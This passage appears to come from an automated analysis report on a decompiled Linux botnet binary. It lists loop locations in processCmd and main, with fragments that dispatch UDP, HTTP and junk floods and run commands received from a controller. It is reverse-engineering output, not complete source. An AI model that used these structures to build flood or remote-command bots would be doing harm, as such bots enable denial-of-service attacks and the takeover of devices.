++++++++ WHILE END : 19938 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 19986 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19995 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 20039 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20051 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 20093 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20102 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 20148 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20160 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 20214 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20223 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 20267 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20279 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 20321 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20330 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 20378 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20388 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 20436 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20445 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 20489 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20501 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 20543 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20552 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 20630 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20639 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 20676 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20688 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 20720 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20729 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 20770 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20780 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 20815 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20827 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 20863 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20875 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 20916 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20928 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 133 @ processCmd ====================================
++++++++ WHILE START : 20962 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20972 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 134 @ processCmd ====================================
++++++++ WHILE START : 21007 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21019 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 135 @ processCmd ====================================
++++++++ WHILE START : 21078 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21095 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v319, v181, v182);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 136 @ processCmd ====================================
++++++++ WHILE START : 21157 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21169 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 137 @ processCmd ====================================
++++++++ WHILE START : 21210 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21220 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 138 @ processCmd ====================================
++++++++ WHILE START : 21265 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21277 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 139 @ processCmd ====================================
++++++++ WHILE START : 21316 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21328 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 140 @ processCmd ====================================
++++++++ WHILE START : 21379 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21391 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 141 @ processCmd ====================================
++++++++ WHILE START : 21432 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21442 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 142 @ processCmd ====================================
++++++++ WHILE START : 21487 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21499 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 143 @ processCmd ====================================
++++++++ WHILE START : 21588 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21597 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 144 @ processCmd ====================================
++++++++ WHILE START : 21654 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21666 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 145 @ processCmd ====================================
++++++++ WHILE START : 21707 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21717 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 146 @ processCmd ====================================
++++++++ WHILE START : 21762 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21774 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 147 @ processCmd ====================================
++++++++ WHILE START : 21813 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21825 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 148 @ processCmd ====================================
++++++++ WHILE START : 21876 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21888 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 149 @ processCmd ====================================
++++++++ WHILE START : 21929 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21939 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 150 @ processCmd ====================================
++++++++ WHILE START : 21984 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21996 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 151 @ processCmd ====================================
++++++++ WHILE START : 22081 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22093 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 152 @ processCmd ====================================
++++++++ WHILE START : 22127 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22137 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 153 @ processCmd ====================================
++++++++ WHILE START : 22172 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22184 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 154 @ processCmd ====================================
++++++++ WHILE START : 22220 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22232 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 155 @ processCmd ====================================
++++++++ WHILE START : 22264 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22274 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 156 @ processCmd ====================================
++++++++ WHILE START : 22343 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22352 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 157 @ processCmd ====================================
++++++++ WHILE START : 22390 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22400 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 158 @ processCmd ====================================
++++++++ WHILE START : 22429 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22441 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 159 @ processCmd ====================================
++++++++ WHILE START : 22473 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22483 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 160 @ processCmd ====================================
++++++++ WHILE START : 22542 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22558 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHOLD(v321, v178, v179);
=============================WHILE LOOPS ID : 161 @ processCmd ====================================
++++++++ WHILE START : 22617 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22627 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 162 @ processCmd ====================================
++++++++ WHILE START : 22659 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22671 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 163 @ processCmd ====================================
++++++++ WHILE START : 22713 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22723 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 164 @ processCmd ====================================
++++++++ WHILE START : 22805 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22814 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 165 @ processCmd ====================================
++++++++ WHILE START : 22862 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22872 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 166 @ processCmd ====================================
++++++++ WHILE START : 22904 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22916 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 167 @ processCmd ====================================
++++++++ WHILE START : 22958 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22968 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 168 @ processCmd ====================================
++++++++ WHILE START : 23024 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23034 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v209, v181, v182);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 169 @ processCmd ====================================
++++++++ WHILE START : 23088 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23098 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 170 @ processCmd ====================================
++++++++ WHILE START : 23130 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23142 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 171 @ processCmd ====================================
++++++++ WHILE START : 23184 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23194 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 172 @ processCmd ====================================
++++++++ WHILE START : 23276 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23285 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 173 @ processCmd ====================================
++++++++ WHILE START : 23333 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23343 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 174 @ processCmd ====================================
++++++++ WHILE START : 23375 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23387 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 175 @ processCmd ====================================
++++++++ WHILE START : 23429 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23439 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 176 @ processCmd ====================================
++++++++ WHILE START : 23521 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23531 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 177 @ processCmd ====================================
++++++++ WHILE START : 23560 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23572 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 178 @ processCmd ====================================
++++++++ WHILE START : 23604 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23614 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 179 @ processCmd ====================================
++++++++ WHILE START : 23683 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23692 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 180 @ processCmd ====================================
++++++++ WHILE START : 23719 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23731 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 181 @ processCmd ====================================
++++++++ WHILE START : 23774 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23784 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v209, v181, v182);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 182 @ processCmd ====================================
++++++++ WHILE START : 23817 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23829 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 183 @ processCmd ====================================
++++++++ WHILE START : 23891 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23900 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 184 @ processCmd ====================================
++++++++ WHILE START : 23927 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23939 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 185 @ processCmd ====================================
++++++++ WHILE START : 24061 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24073 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 186 @ processCmd ====================================
++++++++ WHILE START : 24135 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24144 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 187 @ processCmd ====================================
++++++++ WHILE START : 24171 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24183 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 188 @ processCmd ====================================
++++++++ WHILE START : 24226 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24236 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v209, v181, v182);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 189 @ processCmd ====================================
++++++++ WHILE START : 24269 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24281 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 190 @ processCmd ====================================
++++++++ WHILE START : 24343 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24352 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 191 @ processCmd ====================================
++++++++ WHILE START : 24379 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24391 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 192 @ processCmd ====================================
++++++++ WHILE START : 24441 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24450 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHOLD(v208, v178, v179);
=============================WHILE LOOPS ID : 193 @ processCmd ====================================
++++++++ WHILE START : 24489 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24501 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 194 @ processCmd ====================================
++++++++ WHILE START : 24563 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24572 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 195 @ processCmd ====================================
++++++++ WHILE START : 24599 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24611 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 196 @ processCmd ====================================
++++++++ WHILE START : 24654 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24664 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v209, v181, v182);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 197 @ processCmd ====================================
++++++++ WHILE START : 24697 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24709 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 198 @ processCmd ====================================
++++++++ WHILE START : 24771 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24780 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v210, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 199 @ processCmd ====================================
++++++++ WHILE START : 24807 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24819 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 200 @ getOurIP ====================================
++++++++ WHILE START : 25235 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 25283 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strstr(v151, "\t00000000\t") == 0) {
		if (fdgets(v151, 0x1000, v149) == 0) {
		while (true) {
		__libc_close(v149);
		__libc_close(v144);
		__libc_close(v144);
=============================WHILE LOOPS ID : 201 @ main ====================================
++++++++ WHILE START : 25657 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26027 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v136);
		HackerPrint((int32_t)v150, (int32_t)&v161);
		while (true) {
		if (recvLine((int32_t)v150, (char *)&v153, 0x1000) == -1) {
		while (true) {
		v173 = __libc_waitpid(v172, 0, 1);
		while (true) {
		while (true) {
		free(v179);
		if (strstr(v157, "PING") != v157) {
		int32_t v180 = strstr(v157, "DUP"); // 0x8051ab1
		HackerPrint((int32_t)v150, (int32_t)"PONG");
		while (true) {
		v165 = recvLine((int32_t)v164, (char *)&v153, 0x1000);
		while (true) {
		v173 = __libc_waitpid(v172, 0, 1);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		processCmd(v152, (int32_t *)&v160);
		processCmd(v152, (int32_t *)&v160);
		if (listFork() == 0) {
		while (true) {
		v165 = recvLine((int32_t)v164, (char *)&v153, 0x1000);
		szprintf(v156, (int32_t)"%s 2>&1", v194);
		int32_t v213 = fdpopen(v156, "r"); // 0x8051c81
		if (fdgets(v156, 1024, v213) != 0) {
		while (fdgets(v156, 1024, v213) != 0) {
		fdpclose(v213);
		fdpclose(v213);
=============================WHILE LOOPS ID : 202 @ main ====================================
++++++++ WHILE START : 26045 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26051 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 203 @ main ====================================
++++++++ WHILE START : 26064 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26071 
++++++++ INTRESTING INSTRUCTIONS :  
		if (recvLine((int32_t)v150, (char *)&v153, 0x1000) != -1) {
=============================WHILE LOOPS ID : 207 @ _vfprintf_internal ====================================
++++++++ WHILE START : 32545 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 33173 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 210 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 34175 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 35048 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
